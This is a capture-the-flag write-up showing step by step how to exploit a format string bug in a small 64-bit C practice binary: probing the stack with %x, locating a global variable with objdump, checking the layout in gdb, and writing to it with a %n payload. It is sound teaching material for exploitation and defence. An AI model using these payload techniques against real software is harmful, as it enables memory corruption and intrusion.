Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int unimportant_var0 = 0;
void not_important()
	{
	char buf0[100] = {0};
	read(STDIN_FILENO, buf0, sizeof(buf0) - 1);
	printf(buf0);

	if (unimportant_var0)
		{
			printf("Printf can do that? Oh right I enabled that. It claimed so many lives. Level Cleared\n");
		}
	}

int main()
{
	not_important();
}
```

We see that in order to pass the if then statement, we will need to change the value of the unimportant_var0 to something other than 0. We can see that there is a format string bug in the not_important function, which we can use to write to the unimportan_var0. We see that it uses printf to print the char array buf0, without formatting it correctly. We also see that it writes to buf0 using a read() function, so we get to write to that buffer. So we can control the buffer and execute the format string attack. The first thing we will need to do is figure out where our input is on the stack. We can see that the char array that is being written to is made close to the printf call, so it should be close.

```
$	./f1_64
0000.%1$x.%2$x.%3$x.%4$x
0000.ffffdde0.63.f7b04680.4006a0
```

So it's not in the first four stack locations. Let's keep on searching.

```
$	./f1_64 
0000.%5$x.%6$x.%7$x.%8$x
0000.f7de78e0.30303030.36252e78.2e782437
$	./f1_64 
0000.%6$x
0000.30303030
```

So we have found where our input is on the stack, which is 6 positions away from where we can start writing. Now we need to find the location of the unimportant_var0 interger. Since it is a global int, there should be a static address hard coded for it in the program's symbols, which we can see using object dump.

```
$	objdump -t f1_64 | grep unimportant_var0
000000000060104c g     O .bss	0000000000000004              unimportant_var0
```

So we can see that the address of the unimportant_var0 integer is 0x000000000060104c. Now we need to simply write the address to the buf0 char array, then use a format string exploit to write to that address. 

```
$	python -c 'print "\x4c\x10\x60\x00\x00\x00\x00\x00" + "%6$n"' | ./f1_64
L`%6$n
```

Well that didn't work. Keep in mind that when we found the location of our data on the stack, we were giving it only four characters. Now we are giving it the equivalent of 12 characters, so it is being stored in memory a bit different Let's use gdb to see how exactly the address is stored in memory. Firts let's create the payload.

```
$	python -c 'print "\x4c\x10\x60\x00\x00\x00\x00\x00" + "%6$n"' > payload
```

Now let's look at it in gdb.

```
$	gdb ./f1_64
```

Wall of text later

```
gdb-peda$ b *not_important+76
Breakpoint 1 at 0x400602
gdb-peda$ r < payload
Starting program: /Hackery/escape/fmt_str/f1_64/f1_64 < payload

 [----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x3 
RDX: 0x7ffff7dd3780 --> 0x0 
RSI: 0x602010 --> 0x60104c --> 0x0 
RDI: 0x602013 --> 0x0 
RBP: 0x7fffffffde20 --> 0x7fffffffde30 --> 0x400630 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffddb0 --> 0x60104c --> 0x0 
RIP: 0x400602 (<not_important+76>:	mov    eax,DWORD PTR [rip+0x200a44]        # 0x60104c <unimportant_var0>)
R8 : 0x602000 --> 0x0 
R9 : 0x3 
R10: 0x7ffff7dd1b78 --> 0x602410 --> 0x0 
R11: 0x0 
R12: 0x4004c0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdf10 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005f5 <not_important+63>:	mov    rdi,rax
   0x4005f8 <not_important+66>:	mov    eax,0x0
   0x4005fd <not_important+71>:	call   0x400480 <printf@plt>
=> 0x400602 <not_important+76>:	mov    eax,DWORD PTR [rip+0x200a44]        # 0x60104c <unimportant_var0>
   0x400608 <not_important+82>:	test   eax,eax
   0x40060a <not_important+84>:	je     0x400616 <not_important+96>
   0x40060c <not_important+86>:	mov    edi,0x4006b8
   0x400611 <not_important+91>:	call   0x400470 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 --> 0x60104c --> 0x0 
0008| 0x7fffffffddb8 --> 0xa6e243625 ('%6$n\n')
0016| 0x7fffffffddc0 --> 0x0 
0024| 0x7fffffffddc8 --> 0x0 
0032| 0x7fffffffddd0 --> 0x0 
0040| 0x7fffffffddd8 --> 0x0 
0048| 0x7fffffffdde0 --> 0x0 
0056| 0x7fffffffdde8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400602 in not_important ()
```

So we can see under the stack location, our data is stored between 0x7fffffffddb0 (6 stack locations away from where were printf is) and 0x7fffffffddb8 (7 stack locations away from where were printf is). Let's see exactly what it holds.

```
gdb-peda$ x/x 0x7fffffffddb0
0x7fffffffddb0:	0x000000000060104c
gdb-peda$ x/x 0x7fffffffddb8
0x7fffffffddb8:	0x0000000a6e243625
gdb-peda$ x/2x 0x7fffffffddb0
0x7fffffffddb0:	0x000000000060104c	0x0000000a6e243625
```

So we can see the buf0 address at 0x7fffffffddb0, and the string "%6$n" stored in little endian, in hex at 0x7fffffffddb8. Let's try and move the address of buf0 over to 0x7fffffffddb8. We will need to move the "%6$x" to the front of the string, and change it to "0000%7$x" to account for the new stack location, and needed filler.

```
$	python -c 'print "0000%7$n" + "\x4c\x10\x60\x00\x00\x00\x00\x00"' > payload_2
```

Now let's test it in gdb.

```
gdb-peda$ r < payload_2
```

One wall of text later...

```
Breakpoint 1, 0x0000000000400602 in not_important ()
gdb-peda$ x/2x 0x7fffffffddb0
0x7fffffffddb0:	0x6e24372530303030	0x000000000060104c
```

Here we can see the address of buf0 at 0x7fffffffddb8, and the string "0000%7$n" in hex in little endian at 0x7fffffffddb0. Everything looks good here, so let's proceed.

```
gdb-peda$ c
Continuing.
0000L`Printf can do that? Oh right I enabled that. It claimed so many lives. Level Cleared
[Inferior 1 (process 9335) exited normally]
Warning: not running or target is remote
gdb-peda$ q
```

So that worked, let's try it outside of gdb.

```
$	python -c 'print "0000%7$n" + "\x4c\x10\x60\x00\x00\x00\x00\x00"' | ./f1_64 
0000L`Printf can do that? Oh right I enabled that. It claimed so many lives. Level Cleared
```

Just like that, we pwned the binary! Now why do we have to format our attack that way? To answer that, we can view what's on the stack via the format string bug to get a better picture while using an exploit that is similar to our own in length.

```
$	./f1_64 
0000999901234567.%5$x.%6$x.%7$x.%8$x.%9$x
0000999901234567.f7de78e0.30303030.33323130.2435252e.252e7824
```

Notic that in the 6 slot, we can see the four the hex little endian representation of four zeroes, however in the 7 slot we see the hex representation of "0123" in little endian. It just so happens that the string "0123" is the third set of four characters in our exploit, which so happens to coincide with the address of buf0 in our working exploit. So as we can see, we had to format our exploit in that manner so the printf function would be able to see the address, and write to it properly. Keep this in mind when you are working with format string bugs, that formatting your exploit so printf can use it properly can be tricky.